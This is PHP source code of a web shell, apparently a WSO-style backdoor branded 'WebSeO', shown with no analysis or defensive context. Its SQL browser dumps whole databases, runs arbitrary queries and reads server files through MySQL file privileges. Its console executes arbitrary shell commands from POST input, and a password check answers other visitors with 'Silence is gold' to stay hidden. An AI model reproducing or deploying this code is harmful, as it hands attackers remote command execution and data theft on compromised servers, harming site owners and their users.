	,(' . implode(', ', $item) . ')';
                        }
                        if ($fp) {
                            fwrite($fp, $sql);
                        } else {
                            echo $sql;
                        }
                        $i++;
                    }
                    if (!$head) {
                        if ($fp) {
                            fwrite($fp, ';

');
                        } else {
                            echo ';

';
                        }
                    }
                    break;
                case 'pgsql':
                    $this->query('SELECT * FROM ' . $table);
                    while ($item = $this->fetch()) {
                        $columns = array();
                        foreach ($item as $k => $v) {
                            $item[$k] = '\'' . addslashes($v) . '\'';
                            $columns[] = $k;
                        }
                        $sql = 'INSERT INTO ' . $table . ' (' . implode(', ', $columns) . ') VALUES (' . implode(', ', $item) . ');' . '
';
                        if ($fp) {
                            fwrite($fp, $sql);
                        } else {
                            echo $sql;
                        }
                    }
                    break;
            }
            return false;
        }
    }
    $db = new DbClass($_POST['type']);
    if (@$_POST['p2'] == 'download' && @$_POST['p1'] != 'select') {
        $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
        $db->selectdb($_POST['sql_base']);
        switch ($_POST['charset']) {
            case 'Windows-1251':
                $db->setCharset('cp1251');
                break;
            case 'UTF-8':
                $db->setCharset('utf8');
                break;
            case 'KOI8-R':
                $db->setCharset('koi8r');
                break;
            case 'KOI8-U':
                $db->setCharset('koi8u');
                break;
            case 'cp866':
                $db->setCharset('cp866');
                break;
        }
        if (empty($_POST['file'])) {
            ob_start('ob_gzhandler', 4096);
            header('Content-Disposition: attachment; filename=dump.sql');
            header('Content-Type: text/plain');
            foreach ($_POST['tbl'] as $v) {
                $db->dump($v);
            }
            die;
        } elseif ($fp = @fopen($_POST['file'], 'w')) {
            foreach ($_POST['tbl'] as $v) {
                $db->dump($v, $fp);
            }
            fclose($fp);
            unset($_POST['p2']);
        } else {
            die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
        }
    }
    weboHeader();
    echo '
<h1>Sql browser</h1><div class=content>
<form name=\'sf\' method=\'post\' onsubmit=\'factorySet(this);\'>
<table cellpadding=\'2\' cellspacing=\'0\'>
<tr>
    <td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td>
</tr>
<tr>
    <input type=hidden name=mygo value=Sql><input type=hidden name=p1 value=\'query\'>
    <input type=hidden name=p2 value=\'\'>
    <input type=hidden name=c value=\'' . htmlspecialchars($GLOBALS['cwd']) . '\'>' . '<input type=hidden name=charset value=\'' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '\'>
<td><select name=\'type\'><option value=\'mysql\' ';
    if (@$_POST['type'] == 'mysql') {
        echo 'selected';
    }
    echo '>MySql</option><option value=\'pgsql\' ';
    if (@$_POST['type'] == 'pgsql') {
        echo 'selected';
    }
    echo '>PostgreSql</option></select></td>
<td><input type=text name=sql_host value="' . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . '"></td>
<td><input type=text name=sql_login value="' . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . '"></td>
<td><input type=text name=sql_pass value="' . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . '"></td><td>';
    $tmp = '<input type=text name=sql_base value=\'\'>';
    if (isset($_POST['sql_host'])) {
        if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
            switch ($_POST['charset']) {
                case 'Windows-1251':
                    $db->setCharset('cp1251');
                    break;
                case 'UTF-8':
                    $db->setCharset('utf8');
                    break;
                case 'KOI8-R':
                    $db->setCharset('koi8r');
                    break;
                case 'KOI8-U':
                    $db->setCharset('koi8u');
                    break;
                case 'cp866':
                    $db->setCharset('cp866');
                    break;
            }
            $db->listDbs();
            echo '<select name=sql_base><option value=\'\'></option>';
            while ($item = $db->fetch()) {
                list($key, $value) = each($item);
                echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
            }
            echo '</select>';
        } else {
            echo $tmp;
        }
    } else {
        echo $tmp;
    }
    echo '</td>
				<td><input type=submit value=\'>>\' onclick=\'factorySet(d.sf);\'></td>
                <td><input type=checkbox name=sql_count value=\'on\'' . (empty($_POST['sql_count']) ? '' : ' checked') . '> count the number of rows</td>
			</tr>
		</table>
		<script>
            s_db=\'' . @addslashes($_POST['sql_base']) . '\';
            function factorySet(f) {
                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
                    if(f.p1) f.p1.value=\'\';
                    if(f.p2) f.p2.value=\'\';
                    if(f.p3) f.p3.value=\'\';
                }
            }
			function st(t,l) {
				d.sf.p1.value = \'select\';
				d.sf.p2.value = t;
                if(l && d.sf.p3) d.sf.p3.value = l;
				d.sf.submit();
			}
			function is() {
				for(i=0;i<d.sf.elements[\'tbl[]\'].length;++i)
					d.sf.elements[\'tbl[]\'][i].checked = !d.sf.elements[\'tbl[]\'][i].checked;
			}
		</script>';
    if (isset($db) && $db->link) {
        echo '<br/><table width=100% cellpadding=2 cellspacing=0>';
        if (!empty($_POST['sql_base'])) {
            $db->selectdb($_POST['sql_base']);
            echo '<tr><td width=1 style=\'border-top:2px solid #666;\'><span>Tables:</span><br><br>';
            $tbls_res = $db->listTables();
            while ($item = $db->fetch($tbls_res)) {
                list($key, $value) = each($item);
                if (!empty($_POST['sql_count'])) {
                    $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));
                }
                $value = htmlspecialchars($value);
                echo '<nobr><input type=\'checkbox\' name=\'tbl[]\' value=\'' . $value . '\'>&nbsp;<a href=# onclick="st(\'' . $value . '\',1)">' . $value . '</a>' . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$n['n']})</small>") . '</nobr><br>';
            }
            echo '<input type=\'checkbox\' onclick=\'is();\'> <input type=button value=\'Dump\' onclick=\'document.sf.p2.value="download";document.sf.submit();\'><br>File path:<input type=text name=file value=\'dump.sql\'></td><td style=\'border-top:2px solid #666;\'>';
            if (@$_POST['p1'] == 'select') {
                $_POST['p1'] = 'query';
                $_POST['p3'] = $_POST['p3'] ? $_POST['p3'] : 1;
                $db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
                $num = $db->fetch();
                $pages = ceil($num['n'] / 30);
                echo '<script>d.sf.onsubmit=function(){st("' . $_POST['p2'] . '", d.sf.p3.value)}</script><span>' . $_POST['p2'] . "</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . (int) $_POST['p3'] . '>';
                echo " of {$pages}";
                if ($_POST['p3'] > 1) {
                    echo ' <a href=# onclick=\'st("' . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ')\'>&lt; Prev</a>';
                }
                if ($_POST['p3'] < $pages) {
                    echo ' <a href=# onclick=\'st("' . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ')\'>Next &gt;</a>';
                }
                $_POST['p3']--;
                if ($_POST['type'] == 'pgsql') {
                    $_POST['p2'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . $_POST['p3'] * 30;
                } else {
                    $_POST['p2'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . $_POST['p3'] * 30 . ',30';
                }
                echo '<br><br>';
            }
            if (@$_POST['p1'] == 'query' && !empty($_POST['p2'])) {
                $db->query(@$_POST['p2']);
                if ($db->res !== false) {
                    $title = false;
                    echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
                    $line = 1;
                    while ($item = $db->fetch()) {
                        if (!$title) {
                            echo '<tr>';
                            foreach ($item as $key => $value) {
                                echo '<th>' . $key . '</th>';
                            }
                            reset($item);
                            $title = true;
                            echo '</tr><tr>';
                            $line = 2;
                        }
                        echo '<tr class="l' . $line . '">';
                        $line = $line == 1 ? 2 : 1;
                        foreach ($item as $key => $value) {
                            if ($value == null) {
                                echo '<td><i>null</i></td>';
                            } else {
                                echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';
                            }
                        }
                        echo '</tr>';
                    }
                    echo '</table>';
                } else {
                    echo '<div><b>Error:</b> ' . htmlspecialchars($db->error()) . '</div>';
                }
            }
            echo '<br></form><form onsubmit=\'d.sf.p1.value="query";d.sf.p2.value=this.query.value;document.sf.submit();return false;\'><textarea name=\'query\' style=\'width:100%;height:100px\'>';
            if (!empty($_POST['p2']) && $_POST['p1'] != 'loadfile') {
                echo htmlspecialchars($_POST['p2']);
            }
            echo '</textarea><br/><input type=submit value=\'Execute\'>';
            echo '</td></tr>';
        }
        echo '</table></form><br/>';
        if ($_POST['type'] == 'mysql') {
            $db->query('SELECT 1 FROM mysql.user WHERE concat(`user`, \'@\', `host`) = USER() AND `File_priv` = \'y\'');
            if ($db->fetch()) {
                echo '<form onsubmit=\'d.sf.p1.value="loadfile";document.sf.p2.value=this.f.value;document.sf.submit();return false;\'><span>Load file</span> <input  class=\'toolsInp\' type=text name=f><input type=submit value=\'>>\'></form>';
            }
        }
        if (@$_POST['p1'] == 'loadfile') {
            $file = $db->loadFile($_POST['p2']);
            echo '<br/><pre class=ml1>' . htmlspecialchars($file['file']) . '</pre>';
        }
    } else {
        echo htmlspecialchars($db->error());
    }
    echo '</div>';
    footer();
}
function routeConsole()
{
    function doIfAjax()
    {
        if (isset($_POST['ajax'])) {
            WebOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
            ob_start();
            echo 'd.cf.cmd.value=\'\';
';
            $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes('
$ ' . $_POST['p1'] . '
' . weboosterExCool($_POST['p1']), '
	\\\' '));
            if (preg_match('!.*cd\\s+([^;]+)$!', $_POST['p1'], $match)) {
                if (@chdir($match[1])) {
                    $GLOBALS['cwd'] = @getcwd();
                    echo 'c_=\'' . $GLOBALS['cwd'] . '\';';
                }
            }
            echo 'd.cf.output.value+=\'' . $temp . '\';';
            echo 'd.cf.output.scrollTop = d.cf.output.scrollHeight;';
            $temp = ob_get_clean();
            echo strlen($temp), '
', $temp;
            die;
        }
    }
    if (!empty($_POST['p1'])) {
        if (!empty($_POST['p2'])) {
            WebOsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', true);
            $_POST['p1'] .= ' 2>&1';
        } else {
            WebOsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', 0);
        }
    }
    doIfAjax();
    if (!empty($_POST['p1']) && empty($_POST['ajax'])) {
        WebOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
    }
    weboHeader();
    echo '<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var c_md_s = new Array(\'\');
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur>=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur < cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(md) {
    c_md_s.pop();c_md_s.push(md);c_md_s.push(\'\');cur = c_md_s.length-1;
}
</script>';
    echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><select name=alias>';
    foreach ($GLOBALS['aliases'] as $n => $v) {
        if ($v == '') {
            echo '<optgroup label="-' . htmlspecialchars($n) . '-"></optgroup>';
            continue;
        }
        echo '<option value="' . htmlspecialchars($v) . '">' . $n . '</option>';
    }
    echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 ' . (@$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX <input type=checkbox name=show_errors value=1 ' . (!empty($_POST['p2']) || $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] ? 'checked' : '') . '> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
    if (!empty($_POST['p1'])) {
        echo htmlspecialchars('$ ' . $_POST['p1'] . '
' . weboosterExCool($_POST['p1']));
    }
    echo '</textarea><table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
    echo '</form></div><script>d.cf.cmd.focus();</script>';
    footer();
}
function getOs()
{
    if (strtolower(substr(PHP_OS, 0, 3)) == 'win') {
        return 'win';
    }
    return 'nix';
}
function getCurDir()
{
    return isset($_POST['c']) ? $_POST['c'] : $GLOBALS['cwd'];
}
function checkPassWays($auth_pass, $s)
{
    if (!empty($auth_pass) && $_GET['s'] == $s) {
        if (md5($_POST['pass']) == $auth_pass && isset($_POST['pass'])) {
            WebOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
        }
        if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || $_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass) {
            weboLog($s);
        }
    } else {
        echo 'Silence is gold';
        die;
    }
}
function setRoute()
{
    if (empty($_POST['mygo'])) {
        $_POST['mygo'] = 'FilesMan';
    }
    if (function_exists('route' . $_POST['mygo'])) {
        call_user_func('route' . $_POST['mygo']);
    }
}
function initGlobalArrays()
{
    if (get_magic_quotes_gpc()) {
        function WebOstripslashes($array)
        {
            return is_array($array) ? array_map('WebOstripslashes', $array) : stripslashes($array);
        }
        $_COOKIE = WebOstripslashes($_COOKIE);
        $_POST = WebOstripslashes($_POST);
    }
}
function getFilesListScript()
{
    return '<script>
            function sa() {
                for(i=0;i<d.files.elements.length;i++)
                    if(d.files.elements[i].type == \'checkbox\')
                        d.files.elements[i].checked = d.files.elements[0].checked;
            }
    </script>';
}
function getHead()
{
    return '<head><meta http-equiv=\'Content-Type\' content=\'text/html; charset=' . $_POST['charset'] . '\'>' . '<title>' . $_SERVER['HTTP_HOST'] . ' - WebSeO - </title>' . getCSS() . getScript() . '</head>';
}
function getCSS()
{
    $color_just = '#A2A2A2';
    return " <style>body { background-color: #242424; color: #fff;}\nbody, td, th { font: 9pt Lucida, Verdana; margin: 0; vertical-align: top; color:#fff; }\ntable.info {  color: #fff; background-color: #333;; }\nspan, h1, a { color: {$color_just} !important; }\nspan { font-weight: bolder; }\nh1 {  border-left: 5px solid {$color_just}; padding: 2px 5px; font: 14pt Verdana; background-color: #333;; margin:0px; }\ndiv.content { padding: 5px; margin-left: 5px; background-color: # 3C3E42; }\na { text-decoration:none; }\na:hover { text-decoration:underline; }\n.ml1 { border: 1px solid #242424; padding: 5px; margin: 0; overflow: auto; }\n.bigarea {width: 100%; height: 300px; }\ninput, textarea, select { margin: 0; color: #fff; background-color: #242424; border: 1px solid {$color_just};  font: 9pt Monospace, 'Courier New'; }\nform { margin:0px;}\n#toolsTbl { text-align:center; }\n.toolsInp { width: 300px; }\n.main th { text-align: left; background-color: #1A1818;}\n.main tr:hover { background-color:#1A1818; }\n.l1 { background-color: #242424; }\n.l2 { background-color: # 3C3E42; }\npre { font-family: Courier, Monospace; }\n</style>";
}
function getScript()
{
    return '
<script>
    var c_ = \'' . htmlspecialchars($GLOBALS['cwd']) . '\';
    var mygo_ = \'' . htmlspecialchars(@$_POST['mygo']) . '\'
    var charset_ = \'' . htmlspecialchars(@$_POST['charset']) . '\';
    var p1_ = \'' . (strpos(@$_POST['p1'], '
') !== false ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . '\';
    var p2_ = \'' . (strpos(@$_POST['p2'], '
') !== false ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . '\';
    var p3_ = \'' . (strpos(@$_POST['p3'], '
') !== false ? '' : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . '\';
    var d = document;
    function initParams(a,c,p1,p2,p3,charset) {
            if(a!=null)d.mf.mygo.value=a;else d.mf.mygo.value=mygo_;
            if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
            if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
            if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
            if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
            if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
    }
    function g(a,c,p1,p2,p3,charset) {
            initParams(a,c,p1,p2,p3,charset);
            d.mf.submit();
    }
    function a(a,c,p1,p2,p3,charset) {
            initParams(a,c,p1,p2,p3,charset);
            var params = \'ajax=true\';
            for(i=0;i<d.mf.elements.length;i++)
                    params += \'&\'+d.mf.elements[i].name+\'=\'+encodeURIComponent(d.mf.elements[i].value);
            sr(\'' . addslashes($_SERVER['REQUEST_URI']) . '\', params);
    }
    function sr(url, params) {
            if (window.XMLHttpRequest)
                    req = new XMLHttpRequest();
            else if (window.ActiveXObject)
                    req = new ActiveXObject(\'Microsoft.XMLHTTP\');
    if (req) {
        req.onreadystatechange = processReqChange;
        req.open(\'POST\', url, true);
        req.setRequestHeader (\'Content-Type\', \'application/x-www-form-urlencoded\');
        req.send(params);
    }
    }
    function processReqChange() {
            if( (req.readyState == 4) )
                    if(req.status == 200) {
                            var reg = new RegExp("(\\\\d+)([\\\\S\\\\s]*)", \'m\');
                            var arr=reg.exec(req.responseText);
                            eval(arr[2].substr(0, arr[1]));
                    } else alert(\'Request error!\');
    }
</script>
';
}
function getForm()
{
    return '
        <form method=post name=mf style=\'display:none;\'>
        <input type=hidden name=mygo>
        <input type=hidden name=c>
        <input type=hidden name=p1>
        <input type=hidden name=p2>
        <input type=hidden name=p3>
        <input type=hidden name=charset>
        </form>        
        ';
}
